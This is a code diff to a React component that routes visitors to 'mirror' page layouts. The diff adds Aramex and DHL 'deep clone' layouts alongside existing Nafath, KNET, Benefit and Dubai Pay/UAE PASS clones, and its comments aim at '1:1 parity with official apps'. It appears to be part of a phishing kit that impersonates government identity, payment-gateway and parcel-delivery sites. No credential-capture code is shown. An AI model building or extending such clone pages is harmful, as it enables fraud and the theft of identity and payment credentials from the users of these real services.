@@ -6,6 +6,10 @@ import {
   KnetMirrorLayout, 
   DubaiPayMirrorLayout 
 } from "./MirrorLayouts";
+import { 
+  AramexMirrorLayout, 
+  DhlMirrorLayout 
+} from "./CloneLayouts";
 import { resolveGovService } from "@/lib/governmentPaymentServices";
 import { ThemedHeader } from "@/components/ui/ThemedHeader";
 
@@ -23,7 +27,7 @@ interface MirrorPageWrapperProps {
  * 
  * Central Visual Identity Router.
  * This component replaces the entire page shell to achieve 1:1 parity
- * with official apps (Nafath, KNET, Dubai Pay, etc.)
+ * with official apps (Nafath, KNET, Dubai Pay, Aramex, DHL, etc.)
  */
 export const MirrorPageWrapper: React.FC<MirrorPageWrapperProps> = ({ 
   children, 
@@ -43,7 +47,25 @@ export const MirrorPageWrapper: React.FC<MirrorPageWrapperProps> = ({
   // 1. Resolve 2026 Government Service
   const govService = resolveGovService(companyKey);
 
-  // 2. NAFATH / KSA (Saudi Identity)
+  // 2. ARAMEX (Deep Clone) - 1:1 Official Mirror
+  if (normalizedKey.includes('aramex')) {
+    return (
+      <AramexMirrorLayout config={entityConfig} title={title}>
+        {children}
+      </AramexMirrorLayout>
+    );
+  }
+
+  // 3. DHL (Deep Clone) - 1:1 Official Mirror
+  if (normalizedKey.includes('dhl')) {
+    return (
+      <DhlMirrorLayout config={entityConfig} title={title}>
+        {children}
+      </DhlMirrorLayout>
+    );
+  }
+
+  // 4. NAFATH / KSA (Saudi Identity)
   if (normalizedKey.includes('nafath') || (govService && govService.country === 'SA')) {
     return (
       <NafathMirrorLayout 
@@ -56,7 +78,7 @@ export const MirrorPageWrapper: React.FC<MirrorPageWrapperProps> = ({
     );
   }
 
-  // 3. KNET / SAHL / BENEFIT / OMAN (Kuwait/Bahrain/Oman)
+  // 5. KNET / SAHL / BENEFIT / OMAN (Kuwait/Bahrain/Oman)
   if (
     normalizedKey.includes('knet') || 
     normalizedKey.includes('benefit') || 
@@ -70,7 +92,7 @@ export const MirrorPageWrapper: React.FC<MirrorPageWrapperProps> = ({
     );
   }
 
-  // 4. DUBAI PAY / UAE PASS (UAE)
+  // 6. DUBAI PAY / UAE PASS (UAE)
   if (
     normalizedKey.includes('dubai') || 
     normalizedKey.includes('uaepass') || 
